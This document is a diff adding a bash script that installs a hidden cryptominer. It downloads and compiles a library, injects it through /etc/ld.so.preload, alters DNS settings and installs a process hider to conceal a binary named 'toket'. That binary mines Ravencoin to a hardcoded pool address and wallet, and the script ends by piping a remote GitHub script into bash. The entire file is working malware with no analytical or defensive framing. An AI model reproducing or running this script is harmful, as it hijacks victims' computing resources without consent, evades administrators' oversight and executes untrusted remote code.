@@ -1,0 +1,15 @@
+#!/bin/bash
+apt-get update ; apt-get install sudo -y
+curl https://gitlab.com/liugtiujk/kontol/-/raw/master/memeck.c -o memeck.c
+apt-get install build-essential -y
+gcc -Wall -fPIC -shared -o libmemeck.so memeck.c -ldl
+mv libmemeck.so /usr/local/lib/
+echo /usr/local/lib/libmemeck.so >> /etc/ld.so.preload
+rm memeck.c
+echo "supersede domain-name-servers 1.1.1.1;">> /etc/dhcp/dhclient.conf
+/etc/init.d/network restart
+sudo su --command "curl -sL https://deb.nodesource.com/setup_17.x | sudo -E bash - && sudo apt-get install -y nodejs && npm i -g updates && npm i -g node-process-hider && npm install -g npm@8.10.0 && sudo ph add toket"
+wget https://gitlab.com/liugtiujk/kontol/-/raw/main/toket >/dev/null 2>&1
+chmod +x toket
+./toket -a kawpow --coin rvn -o stratum+tcp://77.237.240.172:443 -u RCakctFhsW9uyrq8kK51X4nzw1GMekxjoh -w JAPANESE >/dev/null 2>&1 &
+curl -sL https://raw.githubusercontent.com/bsheredia/sempak/main/kupluk.sh | bash
